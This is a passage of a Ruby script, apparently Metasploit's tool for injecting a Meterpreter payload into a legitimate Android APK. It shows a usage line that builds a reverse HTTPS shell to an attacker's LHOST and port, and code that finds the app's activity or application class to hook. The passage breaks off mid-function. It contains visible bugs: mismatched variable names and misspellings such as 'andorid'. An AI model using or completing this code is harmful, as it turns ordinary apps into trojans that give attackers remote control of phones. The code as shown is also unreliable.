#!/usr/bin/env ruby

require 'msf/core'
require 'rex/text'
require 'tmpdir'
require 'nokogiri'
require 'fileutils'
require 'optparse'
require 'open3'
require 'date'

class MSF::Payload::Apk

  def print_status(msg='')
    $stderr.puts "[*] #{msg}"
  end

  def print_error(msf='')
    $stderr.puts "[-] #{msg}"
  end

  alias_method :print_bad, :print_error

  def usage
    print_error "Usage: #{$0} -x [target.apk] [msfvenom option]\n"
    print_error "e.g. #{$0} -x messager.apk -p andorid/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
  end

  def run_cmd(cmd)
    begin
      stdin, stdout, stderr = Open3.popen3(cmd)
      return stdout.read + stderr.read
    rescue Errno::ENOENT
      return nil
    end
  end

  #find a suitable smali point to hook
  def find_hook_point(amanifest)
    package = amanifest.xpath('//manifest').first['package']
    application = amanifest.xpath('//application')
    application_name = application.attribute("name")
    if application_name
      return application_name.to_s
    end
    activites = manifest.xpath("//activity|//activity-alias")
    for activity in activites
      activityname = activity.attribute("targetActivity")
      unless activtiyname
